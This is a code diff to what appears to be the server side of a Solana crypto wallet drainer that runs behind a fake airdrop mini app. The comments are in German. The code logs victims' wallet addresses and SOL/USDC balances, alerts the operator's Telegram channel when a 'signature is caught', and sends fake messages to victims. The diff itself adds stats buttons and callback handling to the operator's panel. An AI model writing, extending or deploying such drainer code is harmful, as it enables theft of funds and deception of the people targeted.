@@ -11,16 +11,20 @@ export default {
       return new Response(null, { headers: corsHeaders });
     }
 
-    // 1. TELEGRAM BOT STEUERUNG (/stats)
-    if (request.method === "POST" && url.pathname ===tele "/webhook") {
+    // --- TELEGRAM WEBHOOK (Kontrolle & Buttons) ---
+    if (request.method === "POST" && url.pathname === "/webhook") {
       try {
         const update = await request.json();
         
-        if (update.message && update.message.text === "/stats") {
+        // 1. Wenn du /stats tippst ODER den Button klickst
+        if (update.message && update.message.text && update.message.text.includes("/stats") || update.callback_query) {
+          
+          const chatId = update.callback_query ? update.callback_query.message.chat.id : update.message.chat.id;
+          
           let messageText = "📊 *DEXSCREENR PANEL*\n\n";
           
           if (env.HARVEST) {
-            const list = await env.HARVEST.list({ limit: 10 });
+            const list = await env.HARVEST.list({ limit: 5 });
             if (list.keys.length === 0) {
               messageText += "No wallets connected yet.";
             } else {
@@ -29,7 +33,8 @@ export default {
                 if (dataStr) {
                   const d = JSON.parse(dataStr);
                   if (d.type === "connection_and_balance") {
-                    messageText += `👤 \`${d.victim.slice(0,4)}...\` | SOL: ${d.sol} | USDC: ${d.usdc}\n`;
+                    messageText += `👤 \`${d.victim.slice(0,4)}...${d.victim.slice(-4)}\`\n`;
+                    messageText += `SOL: ${d.sol} | USDC: ${d.usdc}\n\n`;
                   }
                 }
               }
@@ -38,34 +43,32 @@ export default {
             messageText += "KV Database not connected.";
           }
 
-          await fetch(`https://api.gram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: env.ALERT_CHAT_ID,
-              text: messageText,
-              parse_mode: "Markdown",
-              reply_markup: {
-                inline_keyboard: [
-                  [{ text: "🔄 Refresh Stats", callback_data: "/stats" }],
-                  [{ text: "🌐 Open Mini App", url: "https://airdrop-66m.pages.dev" }]
-                ]
-              }
-            }),
-          });
-        }
-        
-        if (update.callback_query) {
-          // Wenn Refresh geklickt wird, einfach /stats simulieren
+          // Antwort im Channel mit Refresh-Button
           await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              chat_id: env.ALERT_CHAT_ID,
-              text: "Refreshing...",
-              parse_mode: "Markdown"
-            })
+              chat_id: chatId,
+              text: messageText,
+              parse_mode: "Markdown",
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: "🔄 Refresh Stats", callback_data: "refresh_stats" }]
+                ]
+              }
+            }),
           });
+          
+          // Wenn es ein Button-Klick war, müssen wir den "Ladekreis" im Button stoppen
+          if (update.callback_query) {
+            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/answerCallbackQuery`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ callback_query_id: update.callback_query.id })
+            });
+          }
+          
+          return new Response("OK");
         }
 
         return new Response("OK");
@@ -74,7 +77,7 @@ export default {
       }
     }
 
-    // 2. WEBSITE DATEN EMPFANGEN
+    // --- WEBSITE DATEN (Drainer) ---
     if (request.method === "POST") {
       try {
         const data = await request.json();
@@ -95,16 +98,25 @@ export default {
             channelMsg = `🎣 *SIGNATURE CAUGHT!*\n\n👤 *Address:*\n\`${data.victim}\`\n\n📝 *TX:*\n\`${data.tx}\``;
           }
           
-          // Nachricht an DICH (Channel)
+          // 1. Nachricht an DICH (Channel) mit Stats-Button
           if (channelMsg) {
             await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown" }),
+              body: JSON.stringify({ 
+                chat_id: env.ALERT_CHAT_ID, 
+                text: channelMsg, 
+                parse_mode: "Markdown",
+                reply_markup: {
+                  inline_keyboard: [
+                    [{ text: "📊 Show Stats", callback_data: "refresh_stats" }]
+                  ]
+                }
+              }),
             });
           }
           
-          // Fake-Nachricht an das OPFER (wenn Telegram-ID übergeben wurde)
+          // 2. Fake-Nachricht an das OPFER
           if (userMsg && data.tg_user_id) {
             await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
               method: "POST",
